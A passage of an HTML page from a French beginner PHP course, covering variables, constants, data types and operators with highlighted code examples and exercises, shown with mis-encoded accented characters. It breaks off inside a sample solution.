                                                &lt;p&gt;</span><span class="keyword">&lt;?php echo</span> <span class="string">"Aujourd'hui nous sommes le "</span> . <span class="keyword">date</span>(<span class="string">"d/m/Y"</span>); <span class="keyword">?&gt;</span><span class="tag">&lt;/p&gt;
                                            &lt;/body&gt;
                                            &lt;/html&gt;</span>
                                        </div>
                                    </div>

                                    <div class="section">
                                        <h3>Points importants √† retenir</h3>
                                        <div class="tips-list">
                                            <ul>
                                                <li>Chaque instruction PHP se termine par un point-virgule <code>;</code></li>
                                                <li>Le code PHP est sensible √† la casse pour les variables : <code>$Nom</code> ‚â† <code>$nom</code></li>
                                                <li>Tu peux √©crire du HTML dans un fichier .php, mais pas l'inverse</li>
                                                <li>Les balises PHP peuvent √™tre plac√©es n'importe o√π dans le HTML</li>
                                                <li>Utilise les commentaires pour expliquer ton code complexe</li>
                                            </ul>
                                        </div>
                                    </div>

                                    <div class="test-section">
                                        <h3>üß™ Teste ton premier script</h3>
                                        <p>Place ton fichier dans le dossier <strong>htdocs</strong> de XAMPP</p>
                                        <p>D√©marre le serveur Apache dans XAMPP</p>
                                        <p>Ouvre ton navigateur et va sur :</p>
                                        <div class="url-highlight">
                                            http://localhost/nom-du-fichier.php
                                        </div>
                                        <p>Si tout fonctionne, tu verras ton message s'afficher <span class="celebration">üéâ</span></p>
                                        <p><strong>Conseil pro :</strong> Teste avec diff√©rents messages et observe les changements !</p>
                                    </div>
                                </div>
                            </div>
                    </section>
                    <section class="quatrieme-partie">
                        <div class="part4-php-course">
                            <div class="header-part4">
                                <h1>Variables, constantes et types de donn√©es</h1>
                                <p>Quatri√®me partie : Les fondations de la m√©moire en PHP</p>
                            </div>

                            <div class="content">

                                <div class="intro-text">
                                    <p>Dans cette partie essentielle, tu vas d√©couvrir comment PHP g√®re la m√©moire √† travers les <strong>variables</strong> et les <strong>constantes</strong>, ainsi que les diff√©rents <strong>types de donn√©es</strong> que tu peux manipuler.</p>
                                    <p>Il est fondamental de bien comprendre cette partie car tout programme ‚Äî simple ou complexe ‚Äî repose sur l‚Äôusage correct de ces √©l√©ments.</p>
                                </div>

                                <!-- VARIABLES -->
                                <section class="section">
                                    <h3>1. Qu‚Äôest-ce qu‚Äôune variable ?</h3>
                                    <p>Une <strong>variable</strong> est une zone de m√©moire temporaire dans laquelle tu peux stocker une valeur (texte, chiffre, etc.). Elle peut changer au cours du programme.</p>
                                    <p>En PHP, une variable commence toujours par le symbole <code>$</code>.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$nom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">$age</span> = <span class="number">24</span>;
                                        <span class="keyword">echo</span> <span class="string">"Je m'appelle $nom et j'ai $age ans."</span>;
                                        <span class="tag">?></span>
                                    </div>

                                    <p><strong>R√©sultat :</strong> Je m'appelle Apaloh et j'ai 24 ans.</p>
                                    <p><strong>Note :</strong> Les noms de variables sont sensibles √† la casse : <code>$Nom</code> ‚â† <code>$nom</code>.</p>
                                </section>

                                <!-- REGLES DE NOMMAGE -->
                                <section class="section">
                                    <h3>2. R√®gles de nommage d'une variable</h3>
                                    <p>Pour nommer une variable, suis ces r√®gles :</p>
                                    <ul>
                                        <li>Doit commencer par un <code>$</code>.</li>
                                        <li>Doit commencer par une lettre ou un underscore <code>_</code>, jamais par un chiffre.</li>
                                        <li>Ne doit contenir que des lettres, chiffres et underscores.</li>
                                        <li>Pas d‚Äôespaces ni de caract√®res sp√©ciaux.</li>
                                    </ul>

                                    <div class="code-block">
                                        <span class="comment">// Valides</span>
                                        <span class="keyword">$nom</span> = <span class="string">"Ali"</span>;
                                        <span class="keyword">$_age</span> = <span class="number">20</span>;

                                        <span class="comment">// Invalides</span>
                                        <span class="comment">// $2age = 20; ‚ùå</span>
                                        <span class="comment">// $nom complet = "Ali Kone"; ‚ùå</span>
                                    </div>
                                </section>

                                <!-- TYPES DE DONNEES -->
                                <section class="section">
                                    <h3>3. Types de donn√©es en PHP</h3>
                                    <p>PHP prend en charge plusieurs types de donn√©es pour r√©pondre √† diff√©rents besoins :</p>
                                    <ul>
                                        <li><strong>String</strong> : Cha√Æne de caract√®res (ex. un nom, une phrase).</li>
                                        <li><strong>Integer</strong> : Nombre entier (ex. 42, -10).</li>
                                        <li><strong>Float / Double</strong> : Nombre √† virgule (ex. 3.14).</li>
                                        <li><strong>Boolean</strong> : Vrai (<code>true</code>) ou faux (<code>false</code>).</li>
                                        <li><strong>Array</strong> : Liste de valeurs, comme une liste de courses ou d‚Äôutilisateurs.</li>
                                        <li><strong>Object</strong> : Structure complexe utilis√©e en programmation orient√©e objet (POO).</li>
                                        <li><strong>NULL</strong> : Absence de valeur, souvent utilis√© pour initialiser une variable vide.</li>
                                    </ul>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$texte</span> = <span class="string">"Bonjour"</span>; <span class="comment">// string</span>
                                        <span class="keyword">$age</span> = <span class="number">25</span>; <span class="comment">// integer</span>
                                        <span class="keyword">$prix</span> = <span class="number">19.99</span>; <span class="comment">// float</span>
                                        <span class="keyword">$estActif</span> = <span class="keyword">true</span>; <span class="comment">// boolean</span>
                                        <span class="keyword">$noms</span> = <span class="keyword">array</span>(<span class="string">"Ali"</span>, <span class="string">"Marie"</span>, <span class="string">"John"</span>); <span class="comment">// array</span>
                                        <span class="keyword">$utilisateur</span> = <span class="keyword">new</span> stdClass(); <span class="comment">// object (exemple simple)</span>
                                        <span class="keyword">$note</span> = <span class="keyword">null</span>; <span class="comment">// null</span>
                                        <span class="keyword">echo</span> <span class="string">"Exemple de tableau : "</span>, <span class="keyword">$noms</span>[0]; <span class="comment">// Affiche "Ali"</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Exemple pratique :</strong> Un tableau peut stocker une liste d‚Äô√©tudiants, et un objet peut repr√©senter un utilisateur avec des propri√©t√©s comme son nom et son email.</p>
                                </section>

                                <!-- CONSTANTES -->
                                <section class="section">
                                    <h3>4. Les constantes</h3>
                                    <p>Contrairement aux variables, une <strong>constante</strong> est une valeur fixe qui ne change jamais pendant l‚Äôex√©cution du script. On la d√©finit avec la fonction <code>define()</code>.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">define</span>(<span class="string">"NOM_SITE"</span>, <span class="string">"InnovaCode"</span>);
                                        <span class="keyword">echo</span> NOM_SITE; <span class="comment">// Affiche "InnovaCode"</span>
                                        <span class="comment">// define("NOM_SITE", "NouveauNom"); // ‚ùå Erreur : constante d√©j√† d√©finie</span>
                                        <span class="tag">?></span>
                                    </div>

                                    <p><strong>Remarques :</strong></p>
                                    <ul>
                                        <li>Pas de <code>$</code> pour les constantes.</li>
                                        <li>Par convention, les constantes sont √©crites en MAJUSCULES.</li>
                                        <li>Utiles pour des valeurs fixes comme des noms de sites ou des configurations.</li>
                                    </ul>
                                </section>

                                <!-- CONVERSION -->
                                <section class="section">
                                    <h3>5. Conversion automatique des types</h3>
                                    <p>PHP est un langage faiblement typ√© : il convertit automatiquement les types de donn√©es si n√©cessaire.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$a</span> = <span class="number">5</span>;
                                        <span class="keyword">$b</span> = <span class="string">"10"</span>;
                                        <span class="keyword">$c</span> = <span class="keyword">$a</span> + <span class="keyword">$b</span>; <span class="comment">// R√©sultat : 15 (PHP convertit "10" en 10)</span>
                                        <span class="keyword">echo</span> <span class="keyword">$c</span>;
                                        <span class="tag">?></span>
                                    </div>

                                    <p><strong>‚ö† Attention :</strong> La conversion automatique peut causer des bugs. Par exemple, <code>"123abc" + 5</code> donnera <code>128</code>, car PHP ignore les lettres apr√®s les chiffres.</p>
                                </section>

                                <!-- VERIFICATION DES TYPES -->
                                <section class="section">
                                    <h3>6. V√©rifier le type d‚Äôune variable</h3>
                                    <p>Pour √©viter les erreurs li√©es aux types, utilise <code>var_dump()</code> pour afficher le type et la valeur d‚Äôune variable.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$valeur</span> = <span class="string">"42"</span>;
                                        <span class="keyword">var_dump</span>(<span class="keyword">$valeur</span>); <span class="comment">// Affiche : string(2) "42"</span>
                                        <span class="keyword">$nombre</span> = <span class="number">42</span>;
                                        <span class="keyword">var_dump</span>(<span class="keyword">$nombre</span>); <span class="comment">// Affiche : int(42)</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Conseil :</strong> Utilise <code>var_dump()</code> pour d√©boguer et v√©rifier que tes variables ont le type attendu.</p>
                                </section>

                                <!-- A RETENIR -->
                                <section class="section">
                                    <h3>üìå Points cl√©s √† retenir</h3>
                                    <div class="info-box">
                                        <ul>
                                            <li>Les variables commencent par <code>$</code> et sont sensibles √† la casse.</li>
                                            <li>Les constantes se d√©finissent avec <code>define()</code> et ne changent jamais.</li>
                                            <li>PHP g√®re plusieurs types de donn√©es : string, integer, float, boolean, array, object, null.</li>
                                            <li>La conversion automatique des types peut causer des erreurs inattendues.</li>
                                            <li>Utilise <code>var_dump()</code> pour v√©rifier le type et la valeur d‚Äôune variable.</li>
                                            <li>Commente ton code pour le rendre clair et maintenable.</li>
                                        </ul>
                                    </div>
                                </section>

                                <!-- EXERCICE -->
                                <div class="test-section">
                                    <h3>üéØ Exercice pratique</h3>
                                    <p>1. Cr√©e un fichier <code>test.php</code> dans le dossier <code>htdocs</code>.</p>
                                    <p>2. D√©clare une variable pour ton nom, ton √¢ge et ta ville.</p>
                                    <p>3. Affiche une phrase comme : <em>"Bonjour, je suis Apaloh, j‚Äôai 24 ans et je vis √† Abidjan."</em></p>
                                    <p>4. D√©clare une constante pour le nom de ton √©cole ou projet.</p>
                                    <p>5. Essaie de modifier la constante apr√®s sa d√©finition‚Ä¶ Que se passe-t-il ?</p>
                                    <p>6. Utilise <code>var_dump()</code> pour v√©rifier le type de tes variables.</p>

                                    <p><strong>Solution exemple :</strong></p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$nom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">$age</span> = <span class="number">24</span>;
                                        <span class="keyword">$ville</span> = <span class="string">"Abidjan"</span>;
                                        <span class="keyword">define</span>(<span class="string">"ECOLE"</span>, <span class="string">"InnovaCode"</span>);
                                        <span class="keyword">echo</span> <span class="string">"Bonjour, je suis $nom, j'ai $age ans et je vis √† $ville."</span>;
                                        <span class="keyword">echo</span> <span class="string">"Mon √©cole est : "</span>, ECOLE;
                                        <span class="keyword">var_dump</span>(<span class="keyword">$nom</span>, <span class="keyword">$age</span>, <span class="keyword">$ville</span>);
                                        <span class="comment">// define("ECOLE", "NouvelleEcole"); // ‚ùå Erreur : constante d√©j√† d√©finie</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>R√©sultat attendu :</strong></p>
                                    <p>Bonjour, je suis Apaloh, j'ai 24 ans et je vis √† Abidjan.<br>Mon √©cole est : InnovaCode<br>string(6) "Apaloh"<br>int(24)<br>string(7) "Abidjan"</p>
                                </div>

                            </div>
                        </div>

                    </section>
                    <section class="part5">
                        <div class="part5-php-course">
                            <div class="header">
                                <h1>Op√©rateurs et expressions</h1>
                                <p>Cinqui√®me partie : Manipuler les donn√©es et construire la logique en PHP</p>
                            </div>

                            <div class="content">

                                <div class="intro-text">
                                    <p>Dans cette partie, nous allons explorer les <strong>op√©rateurs</strong> et les <strong>expressions</strong>, des outils essentiels pour manipuler des donn√©es et cr√©er la logique de tes programmes en PHP. Les op√©rateurs te permettent d‚Äôeffectuer des calculs, de comparer des valeurs, ou de combiner des conditions, tandis que les expressions sont des combinaisons de valeurs, variables, et op√©rateurs qui produisent un r√©sultat.</p>
                                    <p>Ma√Ætriser ces concepts est crucial pour √©crire des scripts dynamiques et interactifs. Chaque exemple est con√ßu pour √™tre clair, et nous inclurons des bonnes pratiques pour t‚Äôaider √† coder de mani√®re efficace et lisible.</p>
                                </div>

                                <!-- INTRODUCTION -->
                                <section class="section">
                                    <h3>1. Qu‚Äôest-ce qu‚Äôune expression et un op√©rateur ?</h3>
                                    <p>Une <strong>expression</strong> est une combinaison de valeurs (comme des nombres ou des cha√Ænes), de variables, et d‚Äôop√©rateurs qui produit un r√©sultat. Par exemple, <code>5 + 3</code> est une expression qui donne <code>8</code>.</p>
                                    <p>Un <strong>op√©rateur</strong> est un symbole ou un mot-cl√© qui indique une op√©ration √† effectuer sur une ou plusieurs valeurs (appel√©es op√©randes). Par exemple, dans <code>5 + 3</code>, <code>+</code> est l‚Äôop√©rateur, et <code>5</code> et <code>3</code> sont les op√©randes.</p>
                                    <p>PHP propose plusieurs types d‚Äôop√©rateurs, que nous allons d√©couvrir ci-dessous.</p>
                                </section>

                                <!-- OPERATEURS ARITHMETIQUES -->
                                <section class="section">
                                    <h3>2. Op√©rateurs arithm√©tiques</h3>
                                    <p>Les op√©rateurs arithm√©tiques permettent d‚Äôeffectuer des calculs math√©matiques sur des nombres (entiers ou flottants).</p>
                                    <table class="operator-table">
                                        <tr><th>Op√©rateur</th><th>Nom</th><th>Exemple</th><th>R√©sultat</th></tr>
                                        <tr><td><code>+</code></td><td>Addition</td><td><code>5 + 3</code></td><td><code>8</code></td></tr>
                                        <tr><td><code>-</code></td><td>Soustraction</td><td><code>5 - 3</code></td><td><code>2</code></td></tr>
                                        <tr><td><code>*</code></td><td>Multiplication</td><td><code>5 * 3</code></td><td><code>15</code></td></tr>
                                        <tr><td><code>/</code></td><td>Division</td><td><code>6 / 2</code></td><td><code>3</code></td></tr>
                                        <tr><td><code>%</code></td><td>Modulo (reste)</td><td><code>7 % 2</code></td><td><code>1</code></td></tr>
                                        <tr><td><code>**</code></td><td>Exponentiation</td><td><code>2 ** 3</code></td><td><code>8</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$a</span> = <span class="number">10</span>;
                                        <span class="keyword">$b</span> = <span class="number">3</span>;
                                        <span class="keyword">echo</span> <span class="string">"Addition : "</span>, <span class="keyword">$a</span> + <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 13</span>
                                        <span class="keyword">echo</span> <span class="string">"Soustraction : "</span>, <span class="keyword">$a</span> - <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 7</span>
                                        <span class="keyword">echo</span> <span class="string">"Multiplication : "</span>, <span class="keyword">$a</span> * <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 30</span>
                                        <span class="keyword">echo</span> <span class="string">"Division : "</span>, <span class="keyword">$a</span> / <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 3.333...</span>
                                        <span class="keyword">echo</span> <span class="string">"Modulo : "</span>, <span class="keyword">$a</span> % <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 1</span>
                                        <span class="keyword">echo</span> <span class="string">"Exponentiation : "</span>, <span class="keyword">$a</span> ** <span class="keyword">2</span>; <span class="comment">// 100</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Exemple pratique :</strong> Calcul du prix total d‚Äôun panier avec remise :</p>
                                    <div class="code-block">
                        <span class="tag"><?php</span>
                        <span class="keyword">$prixArticle</span> = <span class="number">50</span>;
                        <span class="keyword">$quantite</span> = <span class="number">3</span>;
                        <span class="keyword">$remise</span> = <span class="number">0.1</span>; <span class="comment">// 10% de remise</span>
                        <span class="keyword">$total</span> = <span class="keyword">$prixArticle</span> * <span class="keyword">$quantite</span> * (<span class="number">1</span> - <span class="keyword">$remise</span>);
                        <span class="keyword">echo</span> <span class="string">"Prix total apr√®s remise : $total ‚Ç¨"</span>; <span class="comment">// 135 ‚Ç¨</span>
                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- OPERATEURS D'AFFECTATION -->
                                <section class="section">
                                    <h3>3. Op√©rateurs d‚Äôaffectation</h3>
                                    <p>Les op√©rateurs d‚Äôaffectation attribuent une valeur √† une variable. Le plus courant est <code>=</code>, mais il existe des variantes combin√©es pour simplifier les calculs.</p>
                                    <table class="operator-table">
                                        <tr><th>Op√©rateur</th><th>Exemple</th><th>√âquivalent √†</th></tr>
                                        <tr><td><code>=</code></td><td><code>$x = 5</code></td><td><code>$x = 5</code></td></tr>
                                        <tr><td><code>+=</code></td><td><code>$x += 3</code></td><td><code>$x = $x + 3</code></td></tr>
                                        <tr><td><code>-=</code></td><td><code>$x -= 3</code></td><td><code>$x = $x - 3</code></td></tr>
                                        <tr><td><code>*=</code></td><td><code>$x *= 3</code></td><td><code>$x = $x * 3</code></td></tr>
                                        <tr><td><code>/=</code></td><td><code>$x /= 3</code></td><td><code>$x = $x / 3</code></td></tr>
                                        <tr><td><code>%=</code></td><td><code>$x %= 3</code></td><td><code>$x = $x % 3</code></td></tr>
                                    </table>

                                    <div class="code-block">
                        <span class="tag"><?php</span>
                        <span class="keyword">$total</span> = <span class="number">100</span>;
                        <span class="keyword">$total</span> += <span class="number">20</span>; <span class="comment">// $total = 120</span>
                        <span class="keyword">$total</span> -= <span class="number">10</span>; <span class="comment">// $total = 110</span>
                        <span class="keyword">$total</span> *= <span class="number">2</span>; <span class="comment">// $total = 220</span>
                        <span class="keyword">echo</span> <span class="string">"Total apr√®s op√©rations : $total"</span>;
                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Conseil :</strong> Utilise les op√©rateurs combin√©s pour rendre ton code plus concis, mais assure-toi qu‚Äôil reste lisible.</p>
                                </section>

                                <!-- OPERATEURS DE COMPARAISON -->
                                <section class="section">
                                    <h3>4. Op√©rateurs de comparaison</h3>
                                    <p>Les op√©rateurs de comparaison comparent deux valeurs et renvoient <code>true</code> ou <code>false</code>. Ils sont souvent utilis√©s dans les conditions.</p>
                                    <table class="operator-table">
                                        <tr><th>Op√©rateur</th><th>Nom</th><th>Exemple</th><th>R√©sultat</th></tr>
                                        <tr><td><code>==</code></td><td>√âgal</td><td><code>5 == "5"</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>===</code></td><td>Identique</td><td><code>5 === "5"</code></td><td><code>false</code></td></tr>
                                        <tr><td><code>!=</code></td><td>Diff√©rent</td><td><code>5 != 3</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>!==</code></td><td>Non identique</td><td><code>5 !== "5"</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>&lt;</code></td><td>Inf√©rieur</td><td><code>5 &lt; 10</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>&gt;</code></td><td>Sup√©rieur</td><td><code>5 &gt; 10</code></td><td><code>false</code></td></tr>
                                        <tr><td><code>&lt;=</code></td><td>Inf√©rieur ou √©gal</td><td><code>5 &lt;= 5</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>&gt;=</code></td><td>Sup√©rieur ou √©gal</td><td><code>5 &gt;= 10</code></td><td><code>false</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$age</span> = <span class="number">18</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$age</span> == <span class="string">"18"</span> ? <span class="string">"√âgal (==)"</span> : <span class="string">"Non √©gal"</span>;
                                        <span class="keyword">echo</span> <span class="string">"<br>"</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$age</span> === <span class="string">"18"</span> ? <span class="string">"Identique (===)"</span> : <span class="string">"Non identique"</span>;
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>R√©sultat :</strong> √âgal (==)<br>Non identique</p>
                                    <p><strong>‚ö† Attention :</strong> Utilise <code>===</code> pour comparer √† la fois la valeur et le type, surtout avec des donn√©es provenant de formulaires.</p>
                                </section>

                                <!-- OPERATEURS LOGIQUES -->
                                <section class="section">
                                    <h3>5. Op√©rateurs logiques</h3>
                                    <p>Les op√©rateurs logiques combinent des expressions bool√©ennes pour cr√©er des conditions complexes.</p>
                                    <table class="operator-table">
                                        <tr><th>Op√©rateur</th><th>Nom</th><th>Exemple</th><th>R√©sultat</th></tr>
                                        <tr><td><code>&&</code></td><td>ET (AND)</td><td><code>true && false</code></td><td><code>false</code></td></tr>
                                        <tr><td><code>||</code></td><td>OU (OR)</td><td><code>true || false</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>!</code></td><td>NON (NOT)</td><td><code>!true</code></td><td><code>false</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$age</span> = <span class="number">20</span>;
                                        <span class="keyword">$estEtudiant</span> = <span class="keyword">true</span>;
                                        <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span> && <span class="keyword">$estEtudiant</span>) {
                                            <span class="keyword">echo</span> <span class="string">"Vous √™tes majeur et √©tudiant."</span>;
                                        }
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Exemple pratique :</strong> V√©rifier si un utilisateur peut b√©n√©ficier d‚Äôune r√©duction :</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$age</span> = <span class="number">16</span>;
                                        <span class="keyword">$carteEtudiant</span> = <span class="keyword">true</span>;
                                        <span class="keyword">if</span> (<span class="keyword">$age</span> < <span class="number">18</span> || <span class="keyword">$carteEtudiant</span>) {
                                            <span class="keyword">echo</span> <span class="string">"Vous avez droit √† une r√©duction !"</span>;
                                        }
                                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- OPERATEURS D'INCREMENTATION/DECREMENTATION -->
                                <section class="section">
                                    <h3>6. Op√©rateurs d‚Äôincr√©mentation et de d√©cr√©mentation</h3>
                                    <p>Ces op√©rateurs modifient une variable num√©rique de 1.</p>
                                    <table class="operator-table">
                                        <tr><th>Op√©rateur</th><th>Nom</th><th>Exemple</th><th>R√©sultat</th></tr>
                                        <tr><td><code>++</code></td><td>Incr√©mentation</td><td><code>$x++</code></td><td><code>$x = $x + 1</code></td></tr>
                                        <tr><td><code>--</code></td><td>D√©cr√©mentation</td><td><code>$x--</code></td><td><code>$x = $x - 1</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$compteur</span> = <span class="number">5</span>;
                                        <span class="keyword">$compteur</span>++; <span class="comment">// $compteur = 6</span>
                                        <span class="keyword">echo</span> <span class="keyword">$compteur</span>, <span class="string">"<br>"</span>;
                                        <span class="keyword">$compteur</span>--; <span class="comment">// $compteur = 5</span>
                                        <span class="keyword">echo</span> <span class="keyword">$compteur</span>;
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Note :</strong> <code>++$x</code> (pr√©-incr√©mentation) modifie la variable avant son utilisation, tandis que <code>$x++</code> (post-incr√©mentation) l‚Äôutilise d‚Äôabord, puis la modifie.</p>
                                </section>

                                <!-- OPERATEUR DE CONCATENATION -->
                                <section class="section">
                                    <h3>7. Op√©rateur de concat√©nation</h3>
                                    <p>L‚Äôop√©rateur <code>.</code> combine deux cha√Ænes de caract√®res (strings).</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$prenom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">$message</span> = <span class="string">"Bonjour, "</span> . <span class="keyword">$prenom</span> . <span class="string">" !"</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$message</span>; <span class="comment">// Bonjour, Apaloh !</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Alternative :</strong> Tu peux aussi utiliser des guillemets doubles pour inclure des variables directement dans une cha√Æne :</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$prenom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">echo</span> <span class="string">"Bonjour, $prenom !"</span>; <span class="comment">// M√™me r√©sultat</span>
                                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- PRIORITE DES OPERATEURS -->
                                <section class="section">
                                    <h3>8. Priorit√© des op√©rateurs</h3>
                                    <p>PHP √©value les expressions selon une priorit√© d√©finie. Par exemple, <code>*</code> est √©valu√© avant <code>+</code>. Utilise des parenth√®ses <code>()</code> pour forcer l‚Äôordre des op√©rations.</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$resultat</span> = <span class="number">5</span> + <span class="number">3</span> * <span class="number">2</span>; <span class="comment">// 11 (3 * 2 = 6, puis 5 + 6)</span>
                                        <span class="keyword">$resultat2</span> = (<span class="number">5</span> + <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// 16 (5 + 3 = 8, puis 8 * 2)</span>
                                        <span class="keyword">echo</span> <span class="keyword">$resultat</span>, <span class="string">"<br>"</span>, <span class="keyword">$resultat2</span>;
                                        <span class="tag">?></span>
                                        </div>
                                    <p><strong>Conseil :</strong> Utilise toujours des parenth√®ses pour clarifier les expressions complexes et √©viter les erreurs.</p>
                                </section>

                                <!-- BONNES PRATIQUES ET ERREURS -->
                                <section class="section">
                                    <h3>9. Bonnes pratiques et erreurs courantes</h3>
                                    <p>Voici quelques bonnes pratiques pour travailler avec les op√©rateurs :</p>
                                    <ul>
                                        <li><strong>Lisibilit√© :</strong> Espaces autour des op√©rateurs (ex. <code>$a + $b</code> au lieu de <code>$a+$b</code>).</li>
                                        <li><strong>Utilise === :</strong> Pr√©f√©rer <code>===</code> √† <code>==</code> pour √©viter les conversions automatiques inattendues.</li>
                                        <li><strong>√âvite les divisions par z√©ro :</strong> V√©rifie toujours le diviseur avant une division.</li>
                                        <li><strong>Commente ton code :</strong> Explique les calculs complexes ou les conditions logiques.</li>
                                    </ul>
                                    <p><strong>Erreurs courantes :</strong></p>
                                    <ul>
                                        <li><strong>Confusion entre = et == :</strong> <code>$x = 5</code> affecte une valeur, tandis que <code>$x == 5</code> compare.</li>
                                        <li><strong>Division par z√©ro :</strong> <code>$x / 0</code> provoque une erreur fatale.</li>
                                        <li><strong>Priorit√© incorrecte :</strong> Sans parenth√®ses, <code>5 + 3 * 2</code> donne 11, pas 16.</li>
                                    </ul>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$diviseur</span> = <span class="number">0</span>;
                                        <span class="keyword">if</span> (<span class="keyword">$diviseur</span> != <span class="number">0</span>) {
                                            <span class="keyword">echo</span> <span class="number">10</span> / <span class="keyword">$diviseur</span>;
                                        } <span class="keyword">else</span> {
                                            <span class="keyword">echo</span> <span class="string">"Erreur : Division par z√©ro !"</span>;
                                        }
                                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- A RETENIR -->
                                <section class="section">
                                    <h3>üìå Points cl√©s √† retenir</h3>
                                    <div class="info-box">
                                        <ul>
                                            <li>Les op√©rateurs manipulent des valeurs pour former des expressions.</li>
                                            <li>Les op√©rateurs arithm√©tiques (<code>+</code>, <code>-</code>, etc.) effectuent des calculs math√©matiques.</li>
                                            <li>Les op√©rateurs de comparaison (<code>==</code>, <code>===</code>, etc.) renvoient <code>true</code> ou <code>false</code>.</li>
                                            <li>Les op√©rateurs logiques (<code>&&</code>, <code>||</code>, <code>!</code>) combinent des conditions.</li>
                                            <li>Utilise <code>.</code> pour concat√©ner des cha√Ænes et <code>++</code>/<code>--</code> pour modifier des compteurs.</li>
                                            <li>Les parenth√®ses contr√¥lent la priorit√© des op√©rations.</li>
                                            <li>Adopte des bonnes pratiques : lisibilit√©, v√©rification des types, et commentaires.</li>
                                        </ul>
                                    </div>
                                </section>

                                <!-- EXERCICE -->
                                <div class="test-section">
                                    <h3>üéØ Exercice pratique</h3>
                                    <p>Cr√©e un fichier <code>operateurs.php</code> dans le dossier <code>htdocs</code> et r√©alise les t√¢ches suivantes :</p>
                                    <ol>
                                        <li>D√©clare deux variables : <code>$prix</code> (un prix unitaire, ex. 25) et <code>$quantite</code> (ex. 4).</li>
                                        <li>Calcule le prix total avec une remise de 15 % et affiche-le.</li>
                                        <li>V√©rifie si le prix total est sup√©rieur √† 50 et si la quantit√© est inf√©rieure √† 5. Si oui, affiche "Commande sp√©ciale".</li>
                                        <li>Incr√©mente <code>$quantite</code> de 1 et affiche la nouvelle quantit√©.</li>
                                        <li>Concat√®ne un message avec le nom du produit (ex. "T-shirt") et le prix total.</li>
                                        <li>Utilise <code>var_dump()</code> pour v√©rifier le type du prix total.</li>
                                    </ol>

                                    <p><strong>Solution exemple :</strong></p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$prix</span> = <span class="number">25</span>;
                                        <span class="keyword">$quantite</span> = <span class="number">4</span>;
                                        <span class="keyword">$remise</span> = <span class="number">0.15</span>; <span class="comment">// 15%</span>
                                        <span class="keyword">$produit</span> = <span class="string">"T-shirt"</span>;

                                        <span class="comment">// Calcul du prix total avec remise</span>
                                        <span class="keyword">$total</span> = <span class="keyword">$prix</span> * <span class="keyword">$quantite</span> * (<span class="number">1</span> - <span class="keyword">$remise</span>);
                                        <span class="keyword">echo</span> <span class="string">"Prix total apr√®s remise : $total ‚Ç¨<br>"</span>;

                                        <span class="comment">// V√©rification conditionnelle</span>
                                        <span class="keyword">if</span> (<span class="keyword">$total</span> > <span class="number">50</span> && <span class="keyword">$quantite</span> < <span class="number">5</span>) {
                                            <span class="keyword">echo</span> <span class="string">"Commande sp√©ciale<br>"</span>;
                                        }

                                        <span class="comment">// Incr√©mentation</span>
                                        <span class="keyword">$quantite</span>++;
                                        <span class="keyword">echo</span> <span class="string">"Nouvelle quantit√© : $quantite<br>"</span>;

                                        <span class="comment">// Concat√©nation</span>
                                        <span class="keyword">$message</span> = <span class="string">"Produit : "</span> . <span class="keyword">$produit</span> . <span class="string">", Prix total : $total ‚Ç¨"</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$message</span>, <span class="string">"<br>"</span>;

